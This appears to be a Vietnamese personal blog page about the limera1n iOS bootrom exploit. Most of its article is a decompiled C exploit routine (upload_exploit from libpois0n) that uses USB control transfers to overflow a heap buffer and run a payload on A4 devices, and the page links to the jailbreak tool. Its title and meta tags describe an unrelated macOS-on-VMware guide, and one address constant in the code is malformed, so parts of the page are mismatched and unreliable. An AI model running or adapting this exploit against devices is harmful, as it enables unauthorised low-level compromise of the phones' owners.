<!doctype html>
<html lang="vi">

<meta charset="utf-8">
<title>Hướng Dẫn Cài macOS High Sierra Trên VMware &#8211; Hieuvo</title>
<meta name="description" content="Hướng Dẫn Cài macOS High Sierra Trên VMware">
<meta name="keywords" content="Hướng Dẫn, macOS, macOS High Sierra Trên VMware, Cài, High Sierra, Trên">

<meta property="og:locale" content="vi_VN">
<meta property="og:title" content="Hướng Dẫn Cài macOS High Sierra Trên VMware &#8211; Hieuvo">
<meta property="og:description" content="Hướng Dẫn Cài macOS High Sierra Trên VMware">
<meta property="og:url" content="/articles/what-is-limera1n">
<meta property="og:site_name" content="Hieuvo">

<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="../../assets/css/entypo.css" media="all">
<link rel="stylesheet" href="../../assets/css/i.css">
<script src="../../assets/js/jquery.min.js"></script>

<meta http-equiv="cleartype" content="on">

<script src="../../assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>

<link rel="shortcut icon" href="../../favicon.ico">

<script>var __adobewebfontsappname__="dreamweaver"</script><script src="http://use.edgefonts.net/source-sans-pro:n2:default.js" type="text/javascript"></script>
<div id="bump">
<body>
   <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KQ8WZKX"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <header class="site-header darken">
     <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KQ8WZKX');</script>
     <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-105779989-1', 'auto');
  ga('send', 'pageview');

</script>
      <div class="wrap">
        <hgroup>
          <h1><a href="../../index.html">Hieuvo</a></h1>
        </hgroup>
        <a href="#nav" class="menu"><span class="icons">☰</span></a>
        <nav role="navigation">
          <ul>
            <li>
             <a href="../../index.html" title="Hieuvo">Home</a>
            </li>
            <li>
             <a href="../../downloads/index.html">downloads</a>
            </li>
          </ul>
        </nav>
      </div>
    </header>


<section class="article">


  <div class="overlay"></div>
  
  <div class="featured-image" style="background-image: url(../../images/techpaper5.jpg)"></div>
  



      <article class="wrap post">
        <header class="post-header">
          <hgroup>
            <h1>Hướng Dẫn Lưu SHSH2 Blobs</h1>
            <p class="date">Jan 03, 2015</p>
            <p class="intro">Devices with the limera1n vulnerability are the most fun devices to play with.</p>
          </hgroup>
        </header>

        <h2 id="limera1n">limera1n</h2>
<p>limera1n is a bootrom exploit found by <code>geohot</code> that works on all A4 and below devices. The last devices being the iPhone 4 GSM (1,1)(1,3) and the iPhone 4 CDMA (3,3). It is the last public bootrom exploit to be released to this day. A bootrom exploit is an exploit that can be run on a device with any iOS version. Basically meaning the device can be jailbroken for life. The reason I am talking about limera1n is because it will be mentioned often in my posts. I like to mess around with this exploit a lot and find out all of the cool stuff I can do with it. It has been made into a tethered jailbreak (<a href="https://sites.google.com/site/dayt0nsfiles/downloads/limera1nOSX.zip?attredirects=0&amp;d=1">Mac</a>, <a href="https://sites.google.com/site/dayt0nsfiles/downloads/limera1nWIN.exe.zip?attredirects=0&amp;d=1">Windows</a>) by geohot which you can untether using the <code>0x24000 Segment Overflow</code> exploit or the <code>Packet Filter Kernel Exploit</code>.</p>

<h2 id="code-executed">Code Executed</h2>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">signed</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">upload_exploit</span><span class="p">()</span> <span class="p">{</span>
<span class="kt">int</span> <span class="n">device_type</span><span class="p">;</span>
<span class="kt">signed</span> <span class="kt">int</span> <span class="n">payload_address</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">free_address</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">deviceerror</span><span class="p">;</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">chunk_headers_ptr</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sent_counter</span><span class="p">;</span>
<span class="c1">//int v6;</span>
<span class="kt">signed</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> 
<span class="c1">//signed int v8;</span>
<span class="kt">int</span> <span class="n">recv_error_code</span><span class="p">;</span>
<span class="kt">signed</span> <span class="kt">int</span> <span class="n">payload_address2</span><span class="p">;</span>
<span class="kt">signed</span> <span class="kt">int</span> <span class="n">padding_size</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">payload</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">chunk_headers</span><span class="p">;</span>
<span class="c1">//int v14;</span>
<span class="c1">//v14 = *MK_FP(__GS__, 20);</span>
<span class="n">device_type</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">device</span> <span class="o">+</span> <span class="mi">16</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span> <span class="n">device_type</span> <span class="o">==</span> <span class="mi">8930</span> <span class="p">)</span> <span class="p">{</span>
<span class="n">padding_size</span> <span class="o">=</span> <span class="mh">0x2A800</span><span class="p">;</span>
<span class="n">payload_address</span> <span class="o">=</span> <span class="mh">0x8402B001</span><span class="p">;</span>
<span class="n">free_address</span> <span class="o">=</span> <span class="mh">0x8403BF9C</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="n">payload_address</span> <span class="o">=</span> <span class="mh">0x84023001</span><span class="p">;</span>
<span class="n">padding_size</span> <span class="o">=</span> <span class="mh">0x22800</span><span class="p">;</span>
<span class="c1">// free_address = (((device_type == 8920) – 1) &amp; 0xFFFFFFF4) – 0x7BFCC05C;</span>
<span class="k">if</span><span class="p">(</span><span class="n">device_type</span> <span class="o">==</span> <span class="mi">8920</span><span class="p">)</span> <span class="n">free_address</span> <span class="o">=</span> <span class="mh">0x84033FA4</span><span class="p">;</span>
<span class="k">else</span> <span class="n">free_address</span> <span class="o">=</span> <span class="mf">84033F</span><span class="mi">98</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="n">exploit</span><span class="p">,</span> <span class="mh">0x230</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span> <span class="p">{</span>
<span class="c1">//v8 = payload_address;</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Resetting device counters</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="c1">//payload_address = v8;</span>
<span class="p">}</span>

<span class="n">payload_address2</span> <span class="o">=</span> <span class="n">payload_address</span><span class="p">;</span>
<span class="n">deviceerror</span> <span class="o">=</span> <span class="n">irecv_reset_counters</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span> <span class="n">deviceerror</span> <span class="p">)</span> <span class="p">{</span>
<span class="n">irecv_strerror</span><span class="p">(</span><span class="n">deviceerror</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">aCannotFindS</span><span class="p">[</span><span class="mi">12</span><span class="p">]);</span>
<span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="n">chunk_headers_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">;</span>

<span class="k">do</span> <span class="p">{</span>
<span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_headers_ptr</span> <span class="o">=</span> <span class="mi">1029</span><span class="p">;</span>       
<span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_headers_ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">257</span><span class="p">;</span>
<span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_headers_ptr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">payload_address2</span><span class="p">;</span>  
<span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_headers_ptr</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">=</span> <span class="n">free_address</span><span class="p">;</span>
<span class="n">chunk_headers_ptr</span> <span class="o">+=</span> <span class="mi">64</span><span class="p">;</span>
<span class="p">}</span> <span class="k">while</span> <span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_headers_ptr</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">v14</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Sending chunk headers</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="n">sent_counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>

<span class="k">do</span> <span class="p">{</span>
<span class="n">sent_counter</span> <span class="o">+=</span> <span class="mh">0x800</span><span class="p">;</span>
<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">sent_counter</span> <span class="o">&lt;</span> <span class="n">padding_size</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Sending exploit payload</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Sending fake data</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Executing exploit</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="n">irecv_control_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_headers</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">irecv_reset</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>
<span class="n">irecv_finish_transfer</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span> <span class="p">{</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Exploit sent</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Reconnecting to device</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">client</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">irecv_reconnect</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">client</span><span class="p">)</span> <span class="p">{</span>
<span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="k">if</span> <span class="p">(</span><span class="n">libpois0n_debug</span><span class="p">)</span> <span class="p">{</span>
<span class="n">recv_error_code</span> <span class="o">=</span> <span class="n">irecv_strerror</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">aCannotFindS</span><span class="p">[</span><span class="mi">12</span><span class="p">],</span> <span class="n">recv_error_code</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Unable to reconnect</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>

<span class="c1">// compiler stack check</span>
<span class="c1">//if (*MK_FP(__GS__, 20) != v14)</span>
<span class="c1">//    __stack_chk_fail(v6, *MK_FP(__GS__, 20) ^ v14);</span>

<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span></code></pre></div>

<h2 id="limera1n-for-newer-devices">limera1n For Newer Devices</h2>
<p>As of now there are no public bootrom exploits for any newer devices. <a href="https://twitter.com/iH8sn0w/">iH8sn0w</a> has found a very powerful iBoot exploit for A5 and A5X devices, but has not shared it publicly. He has not done this because he says that with just a bit of tweaking he can make it work on newer devices (A5+). If he were to release it anytime soon, Apple is in a position to release a new software update without any problem, effectivly patching it on all of the devices the iBoot exploit would work on.</p>

<script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
<script type="text/javascript">
$('body').prepend('<a href="#" class="back-to-top">Back to Top</a>');

var amountScrolled = 300;

$(window).scroll(function() {
	if ( $(window).scrollTop() > amountScrolled ) {
		$('a.back-to-top').fadeIn('slow');
	} else {
		$('a.back-to-top').fadeOut('slow');
	}
});

$('a.back-to-top, a.simple-back-to-top').click(function() {
	$('html, body').animate({
		scrollTop: 0
	}, 700);
	return false;
});
</script>
<center><h3>-Hieuvo-</h3></center>
</article>
</section>
</body></div>

<div class="push"></div>
  <footer>
    <aside class="wrap">
      <ol class="prev-posts">
        <p class="list-title">Recent Posts</p>
            <li>
              <span class="recent-title"><a href="../down-up-macOS/Downgrade-Upgrade cho macOS.html" title="DClr_Override">Downgrade/Upgrade iOS Đã Khóa Sign (Jailbreak) Trên macOS</a></span>
              <span class="date">SEP 02, 2017</span>
            </li>
            <li>
              <span class="recent-title"><a href="../down-up-Linux/Downgrade-Upgrade cho Linux.html" title="DClr_Override">Downgrade/Upgrade iOS Đã Khóa Sign (Jailbreak) Trên Linux </a></span>
              <span class="date">SEP 03, 2017</span>
            </li>
            <li>
              <span class="recent-title"><a href="../Install-macOS/Hướng Dẫn Cài macOS Trên VMware.html" title="Hướng Dẫn Cài macOS Trên VMware.html">Hướng Dẫn Cài macOS Trên VMware </a></span>
              <span class="date">Aug 31, 2017</span>
            </li>
        
      </ol>

      <div class="social">
        <ul>
            <li><a id="face" href="https://www.facebook.com/Hieuvooo" target="_blank"><span class="foot-link">fb.com/hieuvooo</span></a></li> 
        </ul>
    </div>
    </aside>
    <small>&copy; 2017 Hieuvo.</small>
  </footer>

  <script>!function(e,t,r,a,n,c,l,o){function h(e,t,r,a){for(r='',a='0x'+e.substr(t,2)|0,t+=2;t<e.length;t+=2)r+=String.fromCharCode('0x'+e.substr(t,2)^a); return r}try{for(n=e.getElementsByTagName('a'),l='/cdn-cgi/l/email-protection#',o=l.length,a=0;a<n.length;a++)try{c=n[a],t=c.href.indexOf(l),t>-1&&(c.href='mailto:'+h(c.href,t+o))}catch(f){}for(n=Array.prototype.slice.apply(e.getElementsByClassName('__cf_email__')),a=0;a<n.length;a++)try{c=n[a],c.parentNode.replaceChild(e.createTextNode(h(c.getAttribute('data-cfemail'),0)),c)}catch(f){}}catch(f){}}(document)</script><script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
  <script src="../../assets/js/retina.min.js"></script>
  <script src="../../assets/js/scripts.js"></script>
</html>
